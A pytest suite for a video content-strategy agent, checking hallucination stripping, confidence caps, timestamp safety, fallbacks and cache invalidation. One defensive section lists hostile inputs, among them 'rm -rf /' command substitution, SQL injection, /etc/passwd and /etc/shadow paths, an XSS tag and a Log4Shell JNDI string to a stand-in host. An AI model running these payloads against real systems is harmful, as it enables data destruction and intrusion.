"""
ContentStrategy Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * a claim that cannot show its working is downgraded, not kept
  * the agent cannot express a timestamp even if the model sends one
  * a strategy built without Vision or without Research says so, and its
    confidence is capped to match
  * the cache invalidates when EITHER upstream changes
"""

import json

import pytest
from pydantic import ValidationError

from agents.artifacts import (ClipPriority, ContentOpportunity, ContentStrategy,
                              EvidenceItem, Hook, KeyPoint, ResearchReport,
                              TrendItem, VisionAnalysis, VisionClip,
                              InterestingMoment)
from agents.content_strategy import ContentStrategyAgent
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"
URL_A = "https://example.test/a"
URL_B = "https://example.test/b"
GHOST = "https://example.test/never-retrieved"


# ------------------------------------------------------------- helpers

def strategy_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=500, tokens_out=300, usd=0.005)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_vision(clips=(CALM, LIVELY), analysed=True, moments=0):
    return VisionAnalysis(
        domain="model engineering", provider="injected", model="test",
        live=True,
        clips={c: VisionClip(
            clip_id=c, analysed=analysed,
            summary=f"{c} shows the mechanism turning",
            subjects=["a gear train"], actions=["turning"],
            hook_score=80.0 if c == LIVELY else 20.0,
            visual_quality=70.0, confidence=75.0,
            interesting_moments=[InterestingMoment(at=1.0 * i, what=f"beat {i}")
                                 for i in range(moments)])
              for c in clips},
        hook_clip=LIVELY, story="the mechanism is built, then it runs")


def a_research(evidence=True, insufficient=False):
    ev = [EvidenceItem(title="Piece A", url=URL_A, snippet="s",
                       source="fake", query="q", retrieved_at=1.0,
                       published_at="2026-09-01"),
          EvidenceItem(title="Piece B", url=URL_B, snippet="s",
                       source="fake", query="q", retrieved_at=1.0,
                       published_at="2026-09-02")] if evidence else []
    return ResearchReport(
        domain="model engineering", research_queries=["q"], provider="fake",
        live=True, model="test", evidence=ev,
        trends=[TrendItem(label="mechanisms", observation="they are popular",
                          evidence_urls=[URL_A], confidence=0.8)]
               if evidence else [],
        topics=["gear trains"], keywords=["mechanism"],
        audience_signals=["people want to see it move"],
        content_opportunities=[ContentOpportunity(
            idea="show it running", rationale="the evidence likes motion",
            evidence_urls=[URL_B], confidence=0.7)] if evidence else [],
        insufficient_signal=insufficient or not evidence, confidence=0.7)


GOOD = {
    "audience": "people who build mechanisms",
    "objective": "make them want to build this one",
    "central_topic": "a working gear train",
    "core_angle": "it is simpler than it looks",
    "hook": {"clip_id": LIVELY, "description": "the mechanism moving",
             "why": "motion reads instantly"},
    "narrative_direction": "open on it running, then show why it works",
    "key_points": [
        {"point": "the mechanism actually turns", "support": "vision",
         "clip_ids": [LIVELY]},
        {"point": "mechanisms are having a moment", "support": "research",
         "evidence_urls": [URL_A]},
    ],
    "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "role": "hook",
         "why": "it moves"},
        {"clip_id": CALM, "priority": 2, "role": "support",
         "why": "it explains"},
    ],
    "pacing": "fast",
    "pacing_rationale": "short attention, visible motion",
    "engagement_strategy": "lead with the payoff",
    "risks": ["it may read as a toy"],
    "limitations": ["only two clips"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, clip_set, vision=None, research=None, revision=0):
    agent = ContentStrategyAgent()
    with tracer_span(ctx, "content_strategy") as span:
        return agent.execute(ctx, span, clip_set=clip_set, vision=vision,
                             research=research, revision=revision)


@pytest.fixture
def cs_ctx(director_ctx):
    """A real analysed job with a declared domain."""
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


# ------------------------------------------------ 1. a valid strategy

def test_a_valid_reply_becomes_a_complete_strategy(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)

    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    p = art.payload

    assert isinstance(p, ContentStrategy)
    assert p.strategy_type == "reasoned"
    assert p.audience == "people who build mechanisms"
    assert p.central_topic == "a working gear train"
    assert p.core_angle == "it is simpler than it looks"
    assert p.hook.clip_id == LIVELY
    assert p.pacing == "fast"
    assert p.engagement_strategy
    assert p.narrative_direction
    assert p.risks == ["it may read as a toy"]
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False
    assert art.fallback_used is None


def test_the_envelope_is_complete(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())

    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "ContentStrategy"
    assert art.schema_version >= 1
    assert art.revision == 0
    assert art.produced_by == "content_strategy"
    assert art.produced_at > 0
    assert art.inputs_hash
    assert art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.degraded is False
    assert art.cost is not None


# ------------------------------- 2. both upstreams genuinely consumed

def test_vision_and_research_both_reach_the_prompt(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    seen = []
    ctx.llm = strategy_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_vision(), a_research())

    prompt = seen[0]
    # vision: the actual descriptions, not a JSON dump
    assert "WHAT THE FOOTAGE SHOWS" in prompt
    assert "shows the mechanism turning" in prompt
    assert "a gear train" in prompt
    # research: the actual evidence, with its urls
    assert "WHAT THE WORLD IS SAYING" in prompt
    assert URL_A in prompt and URL_B in prompt
    assert "they are popular" in prompt
    assert "show it running" in prompt
    # and NOT a raw JSON blob of either artifact
    assert '"insufficient_signal"' not in prompt
    assert '"candidate_windows"' not in prompt


def test_both_available_is_recorded_on_the_artifact(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.vision_available is True
    assert p.research_available is True
    assert URL_A in p.research_basis
    assert LIVELY in p.vision_basis


def test_research_opportunities_are_carried_forward(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert "show it running" in p.content_opportunities


# ------------------------------------------- 3. vision only (degraded)

def test_vision_only_still_produces_a_strategy_and_says_what_is_missing(
        cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_vision(), None).payload

    assert p.central_topic                      # still a real strategy
    assert p.vision_available is True
    assert p.research_available is False
    assert any("without current research" in x for x in p.limitations)
    assert p.confidence <= 0.6, "missing research must cap confidence"


def test_vision_only_prompt_forbids_inventing_trends(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    seen = []
    ctx.llm = strategy_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_vision(), None)
    assert "No research was gathered" in seen[0]
    assert "Do NOT state trends" in seen[0]


# ----------------------------------------- 4. research only (degraded)

def test_research_only_still_produces_a_strategy(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, None, a_research()).payload

    assert p.central_topic
    assert p.vision_available is False
    assert p.research_available is True
    assert any("without visual understanding" in x for x in p.limitations)
    assert p.confidence <= 0.6


def test_research_only_prompt_forbids_describing_unseen_footage(cs_ctx,
                                                                tracer_span):
    ctx, clip_set = cs_ctx
    seen = []
    ctx.llm = strategy_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, None, a_research())
    assert "No semantic analysis is available" in seen[0]
    assert "Do NOT guess at content" in seen[0]


def test_a_vision_artifact_with_nothing_analysed_does_not_count_as_vision(
        cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    blind = a_vision(analysed=False)
    p = run(ctx, tracer_span, clip_set, blind, a_research()).payload
    assert p.vision_available is False


def test_an_insufficient_research_report_does_not_count_as_research(
        cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    thin = a_research(evidence=False)
    p = run(ctx, tracer_span, clip_set, a_vision(), thin).payload
    assert p.research_available is False


# ------------------------------------------------- 5. both degraded

def test_both_missing_still_produces_a_valid_strategy(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, None, None)
    p = art.payload

    assert isinstance(p, ContentStrategy)
    assert p.strategy_type == "degraded"
    assert p.vision_available is False and p.research_available is False
    assert p.confidence <= 0.25, "neither upstream must cap confidence hard"
    assert len(p.limitations) >= 2


def test_both_missing_never_raises(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    run(ctx, tracer_span, clip_set, None, None)      # must not raise


# --------------------------------------------------- 6. missing domain

def test_no_domain_still_works_and_is_reported(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(update={"domain": ""})})
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.domain == ""
    assert p.central_topic, "a missing domain must not empty the strategy"


def test_no_domain_prompt_says_so_rather_than_guessing(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(update={"domain": ""})})
    seen = []
    ctx.llm = strategy_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_vision(), a_research())
    assert "not stated by the operator" in seen[0]


def test_no_domain_in_the_fallback_is_a_stated_limitation(cs_ctx,
                                                          tracer_span):
    ctx, clip_set = cs_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(update={"domain": ""})})
    ctx.llm = LLMClient()                           # no key
    p = run(ctx, tracer_span, clip_set, None, None).payload
    assert any("no domain was declared" in x for x in p.limitations)


# ------------------------------------------- 7. malformed model output

@pytest.mark.parametrize("junk", [
    "this is not json at all",
    "",
    "[1, 2, 3]",
    '{"audience": ',
])
def test_malformed_replies_fall_back_rather_than_crash(cs_ctx, tracer_span,
                                                       junk):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(junk)
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert isinstance(art.payload, ContentStrategy)


def test_a_failed_call_falls_back(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    assert art.degraded is True
    assert art.payload.live is False


def test_junk_types_in_every_field_are_survived(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({
        "audience": {"nested": "object"}, "objective": ["a", "list"],
        "central_topic": 42, "core_angle": None, "hook": "not an object",
        "narrative_direction": True,
        "key_points": "not a list", "clip_priorities": {"not": "a list"},
        "pacing": 99, "risks": "not a list", "limitations": None,
        "confidence": "high",
    })
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    p = art.payload
    assert p.central_topic == "42"          # a number coerces to text
    assert p.audience == "" and p.core_angle == ""
    assert p.narrative_direction == "", "a bool must not become text"
    assert p.hook == Hook()
    assert p.key_points == [] and p.clip_priorities == []
    assert p.pacing == "moderate"
    assert p.confidence == 0.0


# -------------------------------------------- 8. invalid enums / values

@pytest.mark.parametrize("bad", ["glacial", "FAST", "", None, 7, "fast "])
def test_an_invalid_pacing_falls_back_to_moderate(cs_ctx, tracer_span, bad):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "pacing": bad})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.pacing == "moderate"


def test_an_invalid_role_falls_back_to_support(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "role": "protagonist"}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.clip_priorities[0].role == "support"


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(cs_ctx, tracer_span, bad):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_a_nonsense_priority_number_is_clamped(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": -40, "role": "hook"},
        {"clip_id": CALM, "priority": 10 ** 9, "role": "support"}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert all(1 <= c.priority <= 99 for c in p.clip_priorities)


def test_a_duplicated_clip_priority_is_kept_once(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1}, {"clip_id": LIVELY,
                                             "priority": 2}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert [c.clip_id for c in p.clip_priorities] == [LIVELY]


# --------------------------------------- 9. hallucinated research claim

def test_a_citation_that_was_never_retrieved_is_stripped(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "mechanism videos get 3x the views", "support": "research",
         "evidence_urls": [GHOST]}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload

    kp = p.key_points[0]
    assert kp.evidence_urls == [], "an invented url must not survive"
    assert kp.support == "none", "an uncited claim must not claim research"
    assert GHOST not in p.research_basis
    assert any("never retrieved" in x for x in p.limitations)


def test_a_claim_with_no_research_at_all_cannot_claim_research(cs_ctx,
                                                               tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "this is trending", "support": "research",
         "evidence_urls": [URL_A]}]})
    # research absent entirely: URL_A is not known, so it cannot ground it
    p = run(ctx, tracer_span, clip_set, a_vision(), None).payload
    assert p.key_points[0].support == "none"
    assert p.research_basis == []


def test_a_real_citation_is_kept(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    research_points = [k for k in p.key_points if k.support == "research"]
    assert research_points and research_points[0].evidence_urls == [URL_A]


def test_a_mixed_citation_list_keeps_only_the_real_one(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "partly grounded", "support": "research",
         "evidence_urls": [URL_A, GHOST]}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.key_points[0].evidence_urls == [URL_A]
    assert p.key_points[0].support == "research"


# ---------------------------------------- 10. unsupported visual claim

def test_a_claim_about_a_clip_that_was_never_analysed_is_downgraded(
        cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "the hands are steady", "support": "vision",
         "clip_ids": [CALM]}]})
    # vision analysed only LIVELY, so a claim about CALM is unsupported
    p = run(ctx, tracer_span, clip_set, a_vision(clips=(LIVELY,)),
            a_research()).payload
    assert p.key_points[0].clip_ids == []
    assert p.key_points[0].support == "none"
    assert any("never analysed" in x for x in p.limitations)


def test_a_claim_about_a_clip_that_does_not_exist_is_downgraded(cs_ctx,
                                                                tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "the drone shot is beautiful", "support": "vision",
         "clip_ids": ["99_invented.mp4"]}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.key_points[0].clip_ids == []
    assert p.key_points[0].support == "none"


def test_an_invented_clip_priority_is_dropped(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": "99_invented.mp4", "priority": 1, "role": "hook"},
        {"clip_id": LIVELY, "priority": 2, "role": "support"}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert [c.clip_id for c in p.clip_priorities] == [LIVELY]


def test_an_invented_hook_clip_becomes_none(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "hook": {
        "clip_id": "99_invented.mp4", "description": "something", "why": "x"}})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.hook.clip_id is None
    assert p.hook.description == "something"


def test_support_is_derived_from_what_survived_not_from_the_claim(
        cs_ctx, tracer_span):
    """A model that says "both" with nothing behind it gets "none"."""
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "trust me", "support": "both",
         "evidence_urls": [GHOST], "clip_ids": ["99_nope.mp4"]}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.key_points[0].support == "none"


def test_an_ungrounded_strategy_is_capped_and_flagged(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "confidence": 1.0, "key_points": [
        {"point": "vibes", "support": "none"}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.confidence <= 0.3
    assert p.insufficient_signal is True


# ------------------------------------------------ 11. timestamp safety

def test_the_schema_makes_a_timestamp_structurally_impossible():
    with pytest.raises(ValidationError):
        ClipPriority(clip_id=LIVELY, priority=1, start=10.5, end=20.0)
    with pytest.raises(ValidationError):
        ClipPriority(clip_id=LIVELY, priority=1, duration=4.0)
    with pytest.raises(ValidationError):
        KeyPoint(point="x", at=3.2)
    with pytest.raises(ValidationError):
        Hook(clip_id=LIVELY, start=1.0)


def test_no_field_of_the_strategy_can_hold_a_time():
    """A timestamp has nowhere to go, in any nested model."""
    banned = {"start", "end", "duration", "at", "in_point", "out_point",
              "timestamp", "offset", "seconds", "t"}
    for model in (ContentStrategy, ClipPriority, KeyPoint, Hook):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_timestamps_is_ignored_not_obeyed(cs_ctx,
                                                          tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "role": "hook",
         "start": 10.5, "end": 20.0, "duration": 9.5}]})
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    p = art.payload
    assert len(p.clip_priorities) == 1
    dumped = p.model_dump()
    assert "10.5" not in json.dumps(dumped)
    assert "start" not in json.dumps(dumped)


def test_a_moment_reference_is_an_index_into_measured_moments(cs_ctx,
                                                              tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "moment_ref": 1}]})
    p = run(ctx, tracer_span, clip_set, a_vision(moments=3),
            a_research()).payload
    assert p.clip_priorities[0].moment_ref == 1


@pytest.mark.parametrize("ref", [9, -1, 2.5, "1", True, None])
def test_an_out_of_range_or_non_integer_moment_reference_is_discarded(
        cs_ctx, tracer_span, ref):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "moment_ref": ref}]})
    p = run(ctx, tracer_span, clip_set, a_vision(moments=2),
            a_research()).payload
    assert p.clip_priorities[0].moment_ref is None


def test_a_moment_reference_with_no_vision_is_discarded(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": LIVELY, "priority": 1, "moment_ref": 0}]})
    p = run(ctx, tracer_span, clip_set, None, a_research()).payload
    assert p.clip_priorities[0].moment_ref is None


# ------------------------------------------------- 12. malicious input

MALICIOUS = [
    "$(rm -rf /)",
    "; DROP TABLE artifacts; --",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe",
    "crop=in_w:in_h:0:0,scale=-1:720",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "file:///etc/shadow",
    "\x00\x00truncated",
    "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(cs_ctx, tracer_span, payload):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "central_topic": payload,
                            "core_angle": payload, "audience": payload,
                            "risks": [payload]})
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    p = art.payload
    # it is stored as text and nothing else - no path, no command, no filter
    assert isinstance(p.central_topic, str)
    assert len(p.central_topic) <= 160
    # round-trips through the store unchanged in kind
    again = ContentStrategy.model_validate_json(p.model_dump_json())
    assert isinstance(again.central_topic, str)


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_clip_id_never_becomes_a_clip(cs_ctx, tracer_span,
                                                  payload):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "clip_priorities": [
        {"clip_id": payload, "priority": 1}],
        "hook": {"clip_id": payload, "description": "x", "why": "y"}})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.clip_priorities == []
    assert p.hook.clip_id is None


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_url_is_not_accepted_as_evidence(cs_ctx, tracer_span,
                                                     payload):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "x", "support": "research", "evidence_urls": [payload]}]})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert p.key_points[0].evidence_urls == []
    assert payload not in p.research_basis


def test_absurdly_long_strings_are_capped(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    huge = "A" * 100_000
    ctx.llm = strategy_llm({**GOOD, "central_topic": huge, "audience": huge,
                            "narrative_direction": huge,
                            "engagement_strategy": huge,
                            "risks": [huge] * 50})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert len(p.central_topic) <= 160
    assert len(p.audience) <= 200
    assert len(p.narrative_direction) <= 400
    assert len(p.engagement_strategy) <= 300
    assert len(p.risks) <= 8


def test_the_number_of_points_and_priorities_is_bounded(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD,
                            "key_points": [{"point": f"p{i}"}
                                           for i in range(200)],
                            "clip_priorities": [{"clip_id": LIVELY,
                                                 "priority": 1}] * 200})
    p = run(ctx, tracer_span, clip_set, a_vision(), a_research()).payload
    assert len(p.key_points) <= 8
    assert len(p.clip_priorities) <= 12


# ------------------------------------------ 13. fallback with no key

def test_with_no_api_key_a_real_strategy_is_still_produced(cs_ctx,
                                                           tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()                       # the state of this machine
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.strategy_type == "degraded"
    assert p.clip_priorities, "the fallback must still rank the clips"
    assert p.confidence == 0.0
    assert any("not reasoned" in x for x in p.limitations)


def test_the_fallback_ranks_by_vision_when_vision_exists(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_vision(), None).payload
    # LIVELY has hook_score 80 vs CALM's 20
    assert p.clip_priorities[0].clip_id == LIVELY
    assert p.clip_priorities[0].role == "hook"
    assert "Vision hook scores" in p.clip_priorities[0].why


def test_the_fallback_ranks_by_measurement_when_vision_is_absent(cs_ctx,
                                                                 tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, None, None).payload
    assert p.clip_priorities
    assert "measured motion" in p.clip_priorities[0].why


def test_the_fallback_does_not_invent_reasoning(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, None, None).payload
    assert p.audience == "", "a fallback must not invent an audience"
    assert p.core_angle == "", "a fallback must not invent an angle"
    assert p.objective == ""
    assert p.engagement_strategy == ""


def test_the_fallback_still_carries_grounded_points_from_vision(cs_ctx,
                                                                tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_vision(), None).payload
    assert p.key_points
    assert all(k.support == "vision" for k in p.key_points)
    assert all(k.clip_ids for k in p.key_points)


def test_the_fallback_with_nothing_at_all_is_minimal_not_empty(cs_ctx,
                                                               tracer_span):
    ctx, clip_set = cs_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(update={"domain": ""})})
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, clip_set, None, None)
    assert art.payload.strategy_type in ("minimal", "degraded")
    assert art.payload.insufficient_signal is True
    assert art.payload.clip_priorities, "clips are still ranked"


# ------------------------------------------------------- 14/15/16. cache

def test_identical_inputs_hit_the_cache(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    calls = []
    ctx.llm = strategy_llm(GOOD, record=calls)
    v, r = a_vision(), a_research()

    first = run(ctx, tracer_span, clip_set, v, r, revision=0)
    second = run(ctx, tracer_span, clip_set, v, r, revision=1)

    assert second.artifact_id == first.artifact_id, "expected a cache hit"
    assert second.revision == 0, "the cached artifact is reused, not rewritten"
    assert len(calls) == 1, "the model must not be called twice"


def test_the_cache_invalidates_when_vision_changes(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    calls = []
    ctx.llm = strategy_llm(GOOD, record=calls)
    r = a_research()

    first = run(ctx, tracer_span, clip_set, a_vision(), r, revision=0)

    changed = a_vision()
    changed = changed.model_copy(update={"clips": {
        c: v.model_copy(update={"summary": "something else entirely"})
        for c, v in changed.clips.items()}})
    second = run(ctx, tracer_span, clip_set, changed, r, revision=1)

    assert second.artifact_id != first.artifact_id
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2, "a changed reading must be re-reasoned"


def test_the_cache_invalidates_when_research_changes(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    calls = []
    ctx.llm = strategy_llm(GOOD, record=calls)
    v = a_vision()

    first = run(ctx, tracer_span, clip_set, v, a_research(), revision=0)

    changed = a_research()
    changed = changed.model_copy(update={"trends": [
        TrendItem(label="a totally different trend", observation="new",
                  evidence_urls=[URL_A], confidence=0.5)]})
    second = run(ctx, tracer_span, clip_set, v, changed, revision=1)

    assert second.artifact_id != first.artifact_id
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_the_domain_changes(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    v, r = a_vision(), a_research()
    first = run(ctx, tracer_span, clip_set, v, r, revision=0)

    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "something completely different"})})
    second = run(ctx, tracer_span, clip_set, v, r, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_losing_an_upstream_entirely_invalidates_the_cache(cs_ctx,
                                                           tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    first = run(ctx, tracer_span, clip_set, a_vision(), a_research(),
                revision=0)
    second = run(ctx, tracer_span, clip_set, a_vision(), None, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(cs_ctx, tracer_span):
    """Unlike Research, a strategy does not go stale on the clock.

    It goes stale when what it was derived from changes. A time bucket here
    would re-reason an unchanged brief on every build for no gain.
    """
    ctx, clip_set = cs_ctx
    agent = ContentStrategyAgent()
    v, r = a_vision(), a_research()
    with tracer_span(ctx, "content_strategy") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, vision=v, research=r,
                          revision=0)
    import time as _t
    _t.sleep(1.1)
    with tracer_span(ctx, "content_strategy") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, vision=v, research=r,
                          revision=1)
    assert a.inputs_hash == b.inputs_hash


# --------------------------------------------- 17. trace propagation

def test_the_trace_id_reaches_the_artifact(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    agent = ContentStrategyAgent()
    with tracer_span(ctx, "content_strategy") as span:
        art = agent.execute(ctx, span, clip_set=clip_set, vision=a_vision(),
                            research=a_research())
        assert art.trace_id == span.trace_id
    rows = ctx.tracer.for_job(ctx.job.job_id)
    mine = [r for r in rows if r["node"] == "content_strategy"]
    assert mine and art.artifact_id in mine[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    run(ctx, tracer_span, clip_set, a_vision(), a_research())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "content_strategy"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 500 and rows[-1]["tokens_out"] == 300


